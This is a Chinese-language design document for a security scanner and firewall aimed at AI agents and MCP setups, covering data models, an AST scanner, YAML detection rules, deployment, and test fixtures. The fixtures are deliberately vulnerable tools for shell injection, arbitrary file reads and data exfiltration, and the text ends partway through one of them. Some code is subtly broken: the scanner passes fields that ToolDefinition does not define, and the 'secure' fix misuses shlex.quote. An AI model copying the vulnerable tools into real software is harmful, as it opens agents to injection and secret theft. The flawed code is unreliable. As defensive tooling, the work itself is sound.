# Agent Security Suite - 工业级技术方案

## Part 1: Agent Audit CLI

### 1.1 产品定位

```
定位：Agent 安全的 "ESLint" / "npm audit"
目标用户：使用 MCP/LangChain/OpenAI Agents 的开发者
核心价值：在 CI/CD 中自动检测 Agent 配置的安全风险
差异化：唯一专注于 Agent 权限和操作链的静态分析工具
```

### 1.2 目录结构

```
agent-audit/
├── README.md
├── LICENSE                          # MIT
├── pyproject.toml                   # Python packaging (使用 Poetry)
│
├── agent_audit/
│   ├── __init__.py
│   ├── __main__.py                  # CLI 入口点
│   ├── version.py
│   │
│   ├── cli/
│   │   ├── __init__.py
│   │   ├── main.py                  # Click CLI 定义
│   │   ├── commands/
│   │   │   ├── __init__.py
│   │   │   ├── scan.py              # agent-audit scan
│   │   │   ├── inspect.py           # agent-audit inspect
│   │   │   └── init.py              # agent-audit init
│   │   └── formatters/
│   │       ├── __init__.py
│   │       ├── terminal.py          # Rich 终端输出
│   │       ├── json.py
│   │       ├── sarif.py             # GitHub Code Scanning
│   │       └── markdown.py
│   │
│   ├── scanners/
│   │   ├── __init__.py
│   │   ├── base.py                  # Scanner 基类
│   │   ├── python_scanner.py        # Python AST 扫描
│   │   ├── mcp_scanner.py           # MCP 协议探测
│   │   ├── config_scanner.py        # YAML/JSON 配置扫描
│   │   └── secret_scanner.py        # 密钥泄露扫描
│   │
│   ├── analyzers/
│   │   ├── __init__.py
│   │   ├── permission_analyzer.py   # 权限分析
│   │   ├── chain_analyzer.py        # 操作链分析
│   │   └── supply_chain.py          # 供应链分析
│   │
│   ├── rules/
│   │   ├── __init__.py
│   │   ├── engine.py                # 规则引擎
│   │   ├── loader.py                # 规则加载器
│   │   ├── builtin/
│   │   │   ├── __init__.py
│   │   │   ├── owasp_agentic.yaml   # OWASP Agentic Top 10
│   │   │   ├── command_injection.yaml
│   │   │   ├── data_exfiltration.yaml
│   │   │   └── supply_chain.yaml
│   │   └── schemas/
│   │       └── rule_schema.json     # 规则 JSON Schema
│   │
│   ├── models/
│   │   ├── __init__.py
│   │   ├── finding.py               # 发现结果模型
│   │   ├── tool.py                  # Tool 定义模型
│   │   └── risk.py                  # 风险评分模型
│   │
│   └── utils/
│       ├── __init__.py
│       ├── ast_helpers.py
│       ├── mcp_client.py            # MCP 协议客户端
│       └── config.py
│
├── tests/
│   ├── conftest.py
│   ├── test_scanners/
│   ├── test_analyzers/
│   └── fixtures/
│       ├── vulnerable_agents/       # 测试用的漏洞样本
│       └── safe_agents/
│
└── .github/
    └── workflows/
        ├── ci.yaml
        └── release.yaml
```

### 1.3 核心数据模型

#### 1.3.1 Finding Model (发现结果)

```python
# agent_audit/models/finding.py

from enum import Enum
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any
from datetime import datetime

class Severity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

class Category(Enum):
    COMMAND_INJECTION = "command_injection"
    DATA_EXFILTRATION = "data_exfiltration"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    SUPPLY_CHAIN = "supply_chain"
    CREDENTIAL_EXPOSURE = "credential_exposure"
    PROMPT_INJECTION = "prompt_injection"
    EXCESSIVE_PERMISSION = "excessive_permission"

@dataclass
class Location:
    """代码位置"""
    file_path: str
    start_line: int
    end_line: int
    start_column: Optional[int] = None
    end_column: Optional[int] = None
    snippet: Optional[str] = None

@dataclass
class Remediation:
    """修复建议"""
    description: str
    code_example: Optional[str] = None
    reference_url: Optional[str] = None

@dataclass
class Finding:
    """安全发现结果"""
    rule_id: str                      # e.g., "AGENT-001"
    title: str
    description: str
    severity: Severity
    category: Category
    location: Location
    confidence: float = 1.0           # 0.0-1.0
    cwe_id: Optional[str] = None      # e.g., "CWE-78"
    owasp_id: Optional[str] = None    # e.g., "OWASP-AGENT-01"
    remediation: Optional[Remediation] = None
    metadata: Dict[str, Any] = field(default_factory=dict)
    detected_at: datetime = field(default_factory=datetime.utcnow)
    
    def to_sarif(self) -> Dict[str, Any]:
        """转换为 SARIF 格式"""
        return {
            "ruleId": self.rule_id,
            "level": self._severity_to_sarif_level(),
            "message": {"text": self.description},
            "locations": [{
                "physicalLocation": {
                    "artifactLocation": {"uri": self.location.file_path},
                    "region": {
                        "startLine": self.location.start_line,
                        "endLine": self.location.end_line
                    }
                }
            }]
        }
    
    def _severity_to_sarif_level(self) -> str:
        mapping = {
            Severity.CRITICAL: "error",
            Severity.HIGH: "error",
            Severity.MEDIUM: "warning",
            Severity.LOW: "note",
            Severity.INFO: "note"
        }
        return mapping[self.severity]
```

#### 1.3.2 Tool Definition Model

```python
# agent_audit/models/tool.py

from dataclasses import dataclass, field
from typing import List, Optional, Set
from enum import Enum, auto

class PermissionType(Enum):
    """权限类型分类"""
    FILE_READ = auto()
    FILE_WRITE = auto()
    FILE_DELETE = auto()
    SHELL_EXEC = auto()
    NETWORK_OUTBOUND = auto()
    NETWORK_INBOUND = auto()
    DATABASE_READ = auto()
    DATABASE_WRITE = auto()
    SECRET_ACCESS = auto()
    BROWSER_CONTROL = auto()
    PROCESS_SPAWN = auto()

class RiskLevel(Enum):
    SAFE = 1
    LOW = 2
    MEDIUM = 3
    HIGH = 4
    CRITICAL = 5

@dataclass
class ToolParameter:
    """Tool 参数定义"""
    name: str
    type: str
    required: bool = False
    description: Optional[str] = None
    allows_arbitrary_input: bool = False
    sanitization_present: bool = False

@dataclass
class ToolDefinition:
    """Agent Tool 定义"""
    name: str
    description: str
    source_file: str
    source_line: int
    
    permissions: Set[PermissionType] = field(default_factory=set)
    risk_level: RiskLevel = RiskLevel.LOW
    parameters: List[ToolParameter] = field(default_factory=list)
    
    mcp_server: Optional[str] = None
    mcp_server_verified: bool = False
    
    has_input_validation: bool = False
    has_output_sanitization: bool = False
    runs_in_sandbox: bool = False
    requires_approval: bool = False
    
    def calculate_risk_score(self) -> float:
        """计算风险分数 (0.0 - 10.0)"""
        score = 0.0
        
        permission_weights = {
            PermissionType.SHELL_EXEC: 3.0,
            PermissionType.SECRET_ACCESS: 2.5,
            PermissionType.FILE_DELETE: 2.0,
            PermissionType.DATABASE_WRITE: 2.0,
            PermissionType.NETWORK_OUTBOUND: 1.5,
            PermissionType.FILE_WRITE: 1.5,
            PermissionType.PROCESS_SPAWN: 2.0,
        }
        
        for perm in self.permissions:
            score += permission_weights.get(perm, 0.5)
        
        if self.has_input_validation:
            score *= 0.7
        if self.runs_in_sandbox:
            score *= 0.5
        if not self.mcp_server_verified:
            score *= 1.3
        
        return min(10.0, score)
```

### 1.4 CLI 主入口实现

```python
# agent_audit/cli/main.py

import click
from pathlib import Path
from typing import Optional, List
from rich.console import Console

from agent_audit.version import __version__

console = Console()

@click.group()
@click.version_option(version=__version__)
@click.option('--verbose', '-v', is_flag=True, help='Enable verbose output')
@click.option('--quiet', '-q', is_flag=True, help='Only show errors')
@click.pass_context
def cli(ctx: click.Context, verbose: bool, quiet: bool):
    """Agent Audit - Security scanner for AI agents and MCP configurations."""
    ctx.ensure_object(dict)
    ctx.obj['verbose'] = verbose
    ctx.obj['quiet'] = quiet


@cli.command()
@click.argument('path', type=click.Path(exists=True), default='.')
@click.option('--format', '-f', 'output_format', 
              type=click.Choice(['terminal', 'json', 'sarif', 'markdown']),
              default='terminal', help='Output format')
@click.option('--output', '-o', type=click.Path(), help='Output file path')
@click.option('--severity', '-s', 
              type=click.Choice(['critical', 'high', 'medium', 'low', 'info']),
              default='low', help='Minimum severity to report')
@click.option('--rules', '-r', type=click.Path(exists=True), 
              multiple=True, help='Additional rule files')
@click.option('--fail-on', type=click.Choice(['critical', 'high', 'medium', 'low']),
              default='high', help='Exit with error if findings at this level')
@click.pass_context
def scan(ctx: click.Context, path: str, output_format: str, output: Optional[str],
         severity: str, rules: tuple, fail_on: str):
    """
    Scan agent code and configurations for security issues.
    
    Examples:
        agent-audit scan ./my-agent
        agent-audit scan . --format sarif --output results.sarif
        agent-audit scan . --severity critical --fail-on critical
    """
    from agent_audit.cli.commands.scan import run_scan
    
    exit_code = run_scan(
        path=Path(path),
        output_format=output_format,
        output_path=Path(output) if output else None,
        min_severity=severity,
        additional_rules=list(rules),
        fail_on_severity=fail_on,
        verbose=ctx.obj['verbose'],
        quiet=ctx.obj['quiet']
    )
    
    ctx.exit(exit_code)


@cli.command()
@click.argument('mcp_url')
@click.option('--timeout', '-t', default=30, help='Connection timeout')
@click.option('--format', '-f', 'output_format',
              type=click.Choice(['terminal', 'json']), default='terminal')
def inspect(mcp_url: str, timeout: int, output_format: str):
    """
    Inspect a running MCP server and analyze its tools.
    
    Examples:
        agent-audit inspect mcp://localhost:8080
        agent-audit inspect stdio://./my-mcp-server
    """
    from agent_audit.cli.commands.inspect import run_inspect
    run_inspect(mcp_url=mcp_url, timeout=timeout, output_format=output_format)


if __name__ == '__main__':
    cli()
```

### 1.5 Python Scanner 实现

```python
# agent_audit/scanners/python_scanner.py

import ast
from pathlib import Path
from typing import List, Set, Optional, Dict, Any
from dataclasses import dataclass, field

from agent_audit.scanners.base import BaseScanner, ScanResult
from agent_audit.models.tool import ToolDefinition, PermissionType

@dataclass
class PythonScanResult(ScanResult):
    """Python 扫描结果"""
    tools: List[ToolDefinition] = field(default_factory=list)
    imports: List[str] = field(default_factory=list)
    function_calls: List[Dict[str, Any]] = field(default_factory=list)
    dangerous_patterns: List[Dict[str, Any]] = field(default_factory=list)

class PythonScanner(BaseScanner):
    """Python 代码扫描器"""
    
    name = "Python Scanner"
    
    # 危险函数映射
    DANGEROUS_FUNCTIONS = {
        'os.system': PermissionType.SHELL_EXEC,
        'os.popen': PermissionType.SHELL_EXEC,
        'subprocess.run': PermissionType.SHELL_EXEC,
        'subprocess.Popen': PermissionType.SHELL_EXEC,
        'subprocess.call': PermissionType.SHELL_EXEC,
        'eval': PermissionType.SHELL_EXEC,
        'exec': PermissionType.SHELL_EXEC,
        'open': PermissionType.FILE_READ,
        'os.remove': PermissionType.FILE_DELETE,
        'shutil.rmtree': PermissionType.FILE_DELETE,
        'requests.get': PermissionType.NETWORK_OUTBOUND,
        'requests.post': PermissionType.NETWORK_OUTBOUND,
        'httpx.get': PermissionType.NETWORK_OUTBOUND,
        'httpx.post': PermissionType.NETWORK_OUTBOUND,
    }
    
    TOOL_DECORATORS = ['tool', 'langchain.tools.tool', 'BaseTool']
    
    def __init__(self, exclude_paths: List[str] = None):
        self.exclude_paths = set(exclude_paths or [])
        
    def scan(self, path: Path) -> List[PythonScanResult]:
        """扫描目录中的所有 Python 文件"""
        results = []
        python_files = self._find_python_files(path)
        
        for py_file in python_files:
            result = self._scan_file(py_file)
            if result:
                results.append(result)
                
        return results
    
    def _find_python_files(self, path: Path) -> List[Path]:
        """查找所有 Python 文件"""
        if path.is_file():
            return [path] if path.suffix == '.py' else []
            
        python_files = []
        for py_file in path.rglob('*.py'):
            rel_path = str(py_file.relative_to(path))
            if any(excl in rel_path for excl in self.exclude_paths):
                continue
            if any(part.startswith('.') or part in ['venv', '__pycache__', 'dist']
                   for part in py_file.parts):
                continue
            python_files.append(py_file)
            
        return python_files
    
    def _scan_file(self, file_path: Path) -> Optional[PythonScanResult]:
        """扫描单个 Python 文件"""
        try:
            source = file_path.read_text(encoding='utf-8')
            tree = ast.parse(source, filename=str(file_path))
        except (SyntaxError, UnicodeDecodeError):
            return None
            
        visitor = PythonASTVisitor(file_path, source)
        visitor.visit(tree)
        
        return PythonScanResult(
            source_file=str(file_path),
            tools=visitor.tools,
            imports=visitor.imports,
            function_calls=visitor.function_calls,
            dangerous_patterns=visitor.dangerous_patterns
        )


class PythonASTVisitor(ast.NodeVisitor):
    """Python AST 访问器"""
    
    def __init__(self, file_path: Path, source: str):
        self.file_path = file_path
        self.source = source
        self.source_lines = source.splitlines()
        
        self.tools: List[ToolDefinition] = []
        self.imports: List[str] = []
        self.function_calls: List[Dict[str, Any]] = []
        self.dangerous_patterns: List[Dict[str, Any]] = []
        
        self._current_function: Optional[str] = None
        self._imported_names: Dict[str, str] = {}
        
    def visit_Import(self, node: ast.Import):
        for alias in node.names:
            self.imports.append(alias.name)
            name = alias.asname or alias.name
            self._imported_names[name] = alias.name
        self.generic_visit(node)
        
    def visit_ImportFrom(self, node: ast.ImportFrom):
        module = node.module or ''
        for alias in node.names:
            full_name = f"{module}.{alias.name}" if module else alias.name
            self.imports.append(full_name)
            name = alias.asname or alias.name
            self._imported_names[name] = full_name
        self.generic_visit(node)
        
    def visit_FunctionDef(self, node: ast.FunctionDef):
        old_func = self._current_function
        self._current_function = node.name
        
        # 检查是否有 @tool 装饰器
        if self._has_tool_decorator(node):
            tool = self._extract_tool_from_function(node)
            if tool:
                self.tools.append(tool)
        
        self.generic_visit(node)
        self._current_function = old_func
        
    def visit_Call(self, node: ast.Call):
        func_name = self._get_call_name(node)
        
        if func_name:
            call_info = {
                'name': func_name,
                'line': node.lineno,
                'in_function': self._current_function
            }
            self.function_calls.append(call_info)
            
            # 检查危险函数
            if func_name in PythonScanner.DANGEROUS_FUNCTIONS:
                pattern = {
                    'type': 'dangerous_function_call',
                    'function': func_name,
                    'permission': PythonScanner.DANGEROUS_FUNCTIONS[func_name],
                    'line': node.lineno,
                    'snippet': self._get_line(node.lineno),
                    'has_tainted_input': self._check_tainted_input(node)
                }
                self.dangerous_patterns.append(pattern)
                
            # 检查 shell=True
            if func_name in ['subprocess.run', 'subprocess.Popen', 'subprocess.call']:
                if self._has_shell_true(node):
                    pattern = {
                        'type': 'shell_true',
                        'function': func_name,
                        'line': node.lineno,
                        'snippet': self._get_line(node.lineno)
                    }
                    self.dangerous_patterns.append(pattern)
        
        self.generic_visit(node)
        
    def _has_tool_decorator(self, node: ast.FunctionDef) -> bool:
        for decorator in node.decorator_list:
            dec_name = self._get_decorator_name(decorator)
            if dec_name and any(t in dec_name for t in PythonScanner.TOOL_DECORATORS):
                return True
        return False
        
    def _extract_tool_from_function(self, node: ast.FunctionDef) -> Optional[ToolDefinition]:
        description = ast.get_docstring(node) or ""
        permissions = self._analyze_function_permissions(node)
        
        return ToolDefinition(
            name=node.name,
            description=description,
            source_file=str(self.file_path),
            source_line=node.lineno,
            permissions=permissions,
            has_input_validation=self._check_input_validation(node),
            can_execute_code=PermissionType.SHELL_EXEC in permissions,
            can_access_filesystem=any(p in permissions for p in [
                PermissionType.FILE_READ, PermissionType.FILE_WRITE
            ]),
            can_access_network=PermissionType.NETWORK_OUTBOUND in permissions
        )
        
    def _analyze_function_permissions(self, node: ast.FunctionDef) -> Set[PermissionType]:
        permissions = set()
        for child in ast.walk(node):
            if isinstance(child, ast.Call):
                func_name = self._get_call_name(child)
                if func_name and func_name in PythonScanner.DANGEROUS_FUNCTIONS:
                    permissions.add(PythonScanner.DANGEROUS_FUNCTIONS[func_name])
        return permissions
        
    def _check_tainted_input(self, node: ast.Call) -> bool:
        if not self._current_function:
            return False
        for arg in node.args:
            if isinstance(arg, ast.Name):
                return True
            if isinstance(arg, ast.JoinedStr):  # f-string
                return True
        return False
        
    def _has_shell_true(self, node: ast.Call) -> bool:
        for keyword in node.keywords:
            if keyword.arg == 'shell':
                if isinstance(keyword.value, ast.Constant) and keyword.value.value is True:
                    return True
        return False
        
    def _get_call_name(self, node: ast.Call) -> Optional[str]:
        if isinstance(node.func, ast.Name):
            name = node.func.id
            return self._imported_names.get(name, name)
        elif isinstance(node.func, ast.Attribute):
            parts = []
            current = node.func
            while isinstance(current, ast.Attribute):
                parts.append(current.attr)
                current = current.value
            if isinstance(current, ast.Name):
                parts.append(current.id)
            parts.reverse()
            return '.'.join(parts)
        return None
        
    def _get_line(self, lineno: int) -> str:
        if 0 < lineno <= len(self.source_lines):
            return self.source_lines[lineno - 1].strip()
        return ""
        
    def _get_decorator_name(self, decorator: ast.expr) -> Optional[str]:
        if isinstance(decorator, ast.Name):
            return decorator.id
        elif isinstance(decorator, ast.Attribute):
            return decorator.attr
        elif isinstance(decorator, ast.Call):
            return self._get_decorator_name(decorator.func)
        return None
        
    def _check_input_validation(self, node: ast.FunctionDef) -> bool:
        for child in ast.walk(node):
            if isinstance(child, (ast.Assert, ast.Raise)):
                return True
        return False
```

### 1.6 规则定义格式 (YAML)

```yaml
# agent_audit/rules/builtin/owasp_agentic.yaml

rules:
  - id: AGENT-001
    title: "Command Injection via Unsanitized Input"
    description: |
      Tool accepts user input passed directly to shell execution
      without proper sanitization, allowing arbitrary command injection.
    severity: critical
    category: command_injection
    cwe_id: CWE-78
    owasp_id: OWASP-AGENT-02
    
    detection:
      patterns:
        - type: python_ast
          match:
            - "subprocess.run($INPUT, shell=True, ...)"
            - "os.system($INPUT)"
            - "eval($INPUT)"
            - "exec($INPUT)"
          where:
            INPUT:
              tainted: true
              
        - type: function_call
          functions:
            - "subprocess.run"
            - "subprocess.Popen"
          arguments:
            shell: true
            
      mcp_tool_patterns:
        - name_contains: ["exec", "shell", "command", "run"]
          lacks: ["sandbox", "allowlist"]
          
    remediation:
      description: |
        1. 使用 shlex.quote() 转义用户输入
        2. 使用参数列表而非字符串拼接
        3. 实现命令白名单
      code_example: |
        # 不安全
        subprocess.run(f"ls {user_input}", shell=True)
        
        # 安全
        import shlex
        subprocess.run(["ls", shlex.quote(user_input)])
      references:
        - https://owasp.org/www-community/attacks/Command_Injection

  - id: AGENT-002
    title: "Potential Data Exfiltration Chain"
    description: |
      Agent has access to both sensitive data sources and external 
      network capabilities, creating a potential data exfiltration path.
    severity: high
    category: data_exfiltration
    cwe_id: CWE-200
    owasp_id: OWASP-AGENT-05
    
    detection:
      operation_chain:
        - sequence:
            - any_of:
                - tool_permission: SECRET_ACCESS
                - tool_name_contains: ["secret", "credential", "key"]
            - followed_by:
                - any_of:
                    - tool_permission: NETWORK_OUTBOUND
                    - tool_name_contains: ["http", "post", "send"]
          max_distance: 5
          
    remediation:
      description: |
        1. 实现网络出站白名单
        2. 对敏感数据访问添加审批流程
        3. 使用 Agent Firewall 实时检测此类操作链

  - id: AGENT-003
    title: "Unverified MCP Server"
    description: |
      Agent connects to an MCP server that lacks signature verification.
    severity: high
    category: supply_chain
    cwe_id: CWE-494
    
    detection:
      mcp_server:
        conditions:
          - signature_verified: false
          - source_not_in:
              - "docker.io/mcp-catalog/*"
              - "ghcr.io/anthropics/*"
              
    remediation:
      description: |
        使用 Docker MCP Gateway with --verify-signatures

  - id: AGENT-004
    title: "Hardcoded Credentials"
    description: |
      Agent configuration contains hardcoded API keys or passwords.
    severity: critical
    category: credential_exposure
    cwe_id: CWE-798
    
    detection:
      patterns:
        - type: regex
          patterns:
            - 'AKIA[0-9A-Z]{16}'
            - 'sk-[a-zA-Z0-9]{48}'
            - 'sk-ant-[a-zA-Z0-9]{40,}'
            - '(?i)(api[_-]?key|secret)\s*[=:]\s*["\']?[a-zA-Z0-9]{20,}'
            
    remediation:
      description: 使用环境变量或密钥管理服务

  - id: AGENT-005
    title: "Excessive Tool Permissions"
    description: |
      Agent is configured with more permissions than necessary.
    severity: medium
    category: excessive_permission
    cwe_id: CWE-250
    
    detection:
      conditions:
        - tool_count: "> 15"
        - has_permissions:
            count: "> 5"
            includes_high_risk: true
            
    remediation:
      description: 减少 Agent 权限，考虑拆分为多个专用 Agent
```

### 1.7 GitHub Action

```yaml
# .github/actions/agent-audit/action.yml

name: 'Agent Audit'
description: 'Security scanner for AI agents'
author: 'Your Name'

branding:
  icon: 'shield'
  color: 'blue'

inputs:
  path:
    description: 'Path to scan'
    required: false
    default: '.'
  severity:
    description: 'Minimum severity (critical, high, medium, low)'
    required: false
    default: 'low'
  fail-on:
    description: 'Fail threshold severity'
    required: false
    default: 'high'
  sarif-file:
    description: 'SARIF output file'
    required: false
    default: 'agent-audit-results.sarif'

runs:
  using: 'composite'
  steps:
    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.11'
        
    - name: Install agent-audit
      shell: bash
      run: pip install agent-audit
      
    - name: Run agent-audit
      shell: bash
      run: |
        agent-audit scan "${{ inputs.path }}" \
          --format sarif \
          --output "${{ inputs.sarif-file }}" \
          --severity "${{ inputs.severity }}" \
          --fail-on "${{ inputs.fail-on }}"
          
    - name: Upload SARIF
      if: always()
      uses: github/codeql-action/upload-sarif@v3
      with:
        sarif_file: ${{ inputs.sarif-file }}
```

### 1.8 pyproject.toml

```toml
[tool.poetry]
name = "agent-audit"
version = "0.1.0"
description = "Security scanner for AI agents and MCP configurations"
authors = ["Your Name <your@email.com>"]
license = "MIT"
readme = "README.md"
keywords = ["ai", "agent", "security", "mcp", "audit"]

[tool.poetry.scripts]
agent-audit = "agent_audit.cli.main:cli"

[tool.poetry.dependencies]
python = "^3.9"
click = "^8.1.0"
rich = "^13.0.0"
pyyaml = "^6.0"
pydantic = "^2.0"

[tool.poetry.group.dev.dependencies]
pytest = "^7.0"
pytest-cov = "^4.0"
black = "^23.0"
ruff = "^0.1.0"
mypy = "^1.0"

[build-system]
requires = ["poetry-core"]
build-backend = "poetry.core.masonry.api"
```
# Agent Security Suite - Part 2: 部署、测试与实施路线图

## 2.7 Docker 部署 (续)

### Dockerfile

```dockerfile
# docker/Dockerfile

FROM python:3.11-slim

WORKDIR /app

# 安装依赖
COPY pyproject.toml poetry.lock ./
RUN pip install poetry && \
    poetry config virtualenvs.create false && \
    poetry install --no-dev --no-interaction

# 复制代码
COPY agent_firewall/ ./agent_firewall/
COPY config/ ./config/

# 默认配置
ENV AGENT_FIREWALL_CONFIG=/app/config/default.yaml

# 入口
ENTRYPOINT ["python", "-m", "agent_firewall"]
CMD ["start"]
```

### Docker Compose (本地开发)

```yaml
# docker/docker-compose.yml

version: '3.8'

services:
  agent-firewall:
    build:
      context: ..
      dockerfile: docker/Dockerfile
    volumes:
      - ./config:/app/config
      - ./logs:/app/logs
    environment:
      - AGENT_FIREWALL_CONFIG=/app/config/default.yaml
      - ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY}
    ports:
      - "8080:8080"  # API 端口（用于审批 webhook）
    restart: unless-stopped
    
  # 可选: Redis (用于分布式会话)
  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
    profiles:
      - distributed
```

### Docker MCP Gateway 集成配置

```yaml
# 用户在 Docker MCP Gateway 中的配置示例
# docker mcp gateway run --config=gateway-config.yaml

interceptors:
  before:
    - name: agent-firewall
      type: exec
      command: "docker run --rm -i agent-firewall:latest intercept"
      timeout: 30s

servers:
  - name: filesystem
    image: mcp-catalog/filesystem
  - name: brave
    image: mcp-catalog/brave
```

---

## 2.8 Slack 通知器实现

```python
# agent_firewall/notifiers/slack.py

import json
from typing import Dict, Any, Optional
from dataclasses import dataclass
import aiohttp

from agent_firewall.notifiers.base import BaseNotifier
from agent_firewall.models.decision import Decision, DecisionAction

@dataclass
class SlackConfig:
    webhook_url: str
    channel: str = "#agent-alerts"
    username: str = "Agent Firewall"
    icon_emoji: str = ":shield:"

class SlackNotifier(BaseNotifier):
    """Slack 通知器"""
    
    name = "Slack"
    
    def __init__(self, config: SlackConfig):
        self.config = config
        
    async def notify(self, decision: Decision):
        """发送 Slack 通知"""
        card = decision.to_notification_card()
        blocks = self._build_blocks(decision, card)
        
        payload = {
            "channel": self.config.channel,
            "username": self.config.username,
            "icon_emoji": self.config.icon_emoji,
            "blocks": blocks,
            "text": card['summary']  # fallback
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(
                self.config.webhook_url,
                json=payload,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as response:
                if response.status != 200:
                    raise Exception(f"Slack API error: {response.status}")
                    
    def _build_blocks(self, decision: Decision, card: Dict[str, Any]) -> list:
        """构建 Slack Block Kit 消息"""
        
        color_map = {
            DecisionAction.BLOCK: "#FF0000",
            DecisionAction.PAUSE: "#FF8C00",
            DecisionAction.NOTIFY: "#FFD700",
            DecisionAction.ALLOW_WITH_LOG: "#87CEEB",
            DecisionAction.ALLOW: "#00FF00",
        }
        
        blocks = [
            {
                "type": "header",
                "text": {
                    "type": "plain_text",
                    "text": card['title']
                }
            },
            {
                "type": "section",
                "fields": [
                    {
                        "type": "mrkdwn",
                        "text": f"*Risk Level:* {card['risk_level']}"
                    },
                    {
                        "type": "mrkdwn",
                        "text": f"*Risk Score:* {card['risk_score']}"
                    }
                ]
            },
            {
                "type": "section",
                "text": {
                    "type": "mrkdwn",
                    "text": f"*Summary:*\n{card['summary']}"
                }
            },
            {
                "type": "section",
                "text": {
                    "type": "mrkdwn",
                    "text": f"*Explanation:*\n{card['explanation'][:500]}"
                }
            }
        ]
        
        # 添加审批按钮
        if decision.action == DecisionAction.PAUSE:
            blocks.append({
                "type": "actions",
                "elements": [
                    {
                        "type": "button",
                        "text": {"type": "plain_text", "text": "✅ Approve"},
                        "style": "primary",
                        "action_id": "approve",
                        "value": decision.decision_id
                    },
                    {
                        "type": "button",
                        "text": {"type": "plain_text", "text": "❌ Deny"},
                        "style": "danger",
                        "action_id": "deny",
                        "value": decision.decision_id
                    },
                    {
                        "type": "button",
                        "text": {"type": "plain_text", "text": "🔍 Details"},
                        "action_id": "inspect",
                        "value": decision.decision_id
                    }
                ]
            })
            
        # 推荐操作
        if card.get('recommendation'):
            blocks.append({
                "type": "context",
                "elements": [{
                    "type": "mrkdwn",
                    "text": f"💡 *Recommendation:* {card['recommendation']}"
                }]
            })
            
        return blocks
```

---

## 2.9 审计日志

```python
# agent_firewall/storage/audit_log.py

import json
from datetime import datetime
from pathlib import Path
from typing import Optional
import aiofiles

from agent_firewall.models.request import ToolCallRequest
from agent_firewall.models.decision import Decision

class AuditLog:
    """审计日志"""
    
    def __init__(self, log_path: str = "./logs/audit.jsonl"):
        self.log_path = Path(log_path)
        
    async def initialize(self):
        """初始化日志目录"""
        self.log_path.parent.mkdir(parents=True, exist_ok=True)
        
    async def log(self, request: ToolCallRequest, decision: Decision):
        """记录审计条目"""
        entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "request_id": request.request_id,
            "decision_id": decision.decision_id,
            "tool_name": request.tool_name,
            "tool_arguments": request.tool_arguments,
            "mcp_server": request.mcp_server,
            "action": decision.action.value,
            "risk_level": decision.risk_level.value,
            "risk_score": decision.risk_score,
            "explanation": decision.explanation,
            "matched_patterns": decision.context.detected_patterns,
            "operation_chain": decision.context.operation_chain,
            "approval_required": decision.approval_required,
            "approved_by": decision.approved_by,
        }
        
        async with aiofiles.open(self.log_path, mode='a') as f:
            await f.write(json.dumps(entry) + "\n")
```

---

# Part 3: 共享核心引擎

## 3.1 Monorepo 结构

```
agent-security-suite/
├── README.md
├── LICENSE
├── pyproject.toml              # 根 workspace 配置
│
├── packages/
│   ├── core/                   # 共享核心
│   │   ├── pyproject.toml
│   │   └── agent_core/
│   │       ├── __init__.py
│   │       ├── models/         # 共享数据模型
│   │       ├── rules/          # 共享规则引擎和规则集
│   │       └── utils/          # 共享工具函数
│   │
│   ├── audit/                  # Agent Audit CLI
│   │   ├── pyproject.toml
│   │   └── agent_audit/
│   │       ├── cli/
│   │       ├── scanners/
│   │       └── analyzers/
│   │
│   └── firewall/               # Agent Firewall
│       ├── pyproject.toml
│       └── agent_firewall/
│           ├── adapters/
│           ├── layers/
│           ├── engine/
│           └── notifiers/
│
├── rules/                      # 规则集合
│   ├── builtin/
│   │   ├── owasp_agentic.yaml
│   │   ├── command_injection.yaml
│   │   ├── data_exfiltration.yaml
│   │   └── ...
│   └── community/              # 社区贡献的规则
│
├── tests/
│   ├── integration/
│   │   ├── test_full_pipeline.py
│   │   └── test_docker_gateway.py
│   └── fixtures/
│       ├── vulnerable_agents/
│       └── mcp_configs/
│
├── docker/
│   ├── Dockerfile.audit
│   ├── Dockerfile.firewall
│   └── docker-compose.yml
│
├── .github/
│   ├── workflows/
│   │   ├── ci.yaml
│   │   ├── release-audit.yaml
│   │   └── release-firewall.yaml
│   └── actions/
│       └── agent-audit/
│           └── action.yml
│
└── docs/
    ├── getting-started.md
    ├── rules-reference.md
    ├── api-reference.md
    └── deployment-guide.md
```

## 3.2 共享依赖关系

```toml
# packages/core/pyproject.toml
[tool.poetry]
name = "agent-security-core"
version = "0.1.0"
description = "Core engine for Agent Security Suite"

[tool.poetry.dependencies]
python = "^3.9"
pyyaml = "^6.0"
pydantic = "^2.0"

# packages/audit/pyproject.toml
[tool.poetry]
name = "agent-audit"
version = "0.1.0"

[tool.poetry.dependencies]
python = "^3.9"
agent-security-core = {path = "../core"}
click = "^8.0"
rich = "^13.0"

[tool.poetry.scripts]
agent-audit = "agent_audit.cli.main:cli"

# packages/firewall/pyproject.toml
[tool.poetry]
name = "agent-firewall"
version = "0.1.0"

[tool.poetry.dependencies]
python = "^3.9"
agent-security-core = {path = "../core"}
aiohttp = "^3.9"
aiofiles = "^23.0"
```

---

# Part 4: 测试策略

## 4.1 测试夹具 (Fixtures)

### 漏洞样本文件

```python
# tests/fixtures/vulnerable_agents/command_injection.py
"""
测试夹具：包含命令注入漏洞的 Agent
"""

import subprocess
import os
from langchain.tools import tool

@tool
def execute_command(command: str) -> str:
    """Execute a shell command and return its output."""
    # 漏洞：直接执行用户输入的命令
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout

@tool
def read_file(filepath: str) -> str:
    """Read a file and return its contents."""
    # 漏洞：没有路径验证
    with open(filepath, 'r') as f:
        return f.read()

@tool
def send_data(url: str, data: str) -> str:
    """Send data to a URL."""
    import requests
    # 漏洞：没有 URL 白名单
    response = requests.post(url, json={"data": data})
    return str(response.status_code)
```

```python
# tests/fixtures/vulnerable_agents/data_exfiltration.py
"""
测试夹具：包含数据泄露链的 Agent
"""

import os
import requests
from langchain.tools import tool

@tool
def get_api_key(service: str) -> str:
    """Get an API key for a service."""
    # 敏感数据访问
    return os.environ.get(f"{service.upper()}_API_KEY", "")

@tool
def post_to_webhook(url: str, payload: str) -> str:
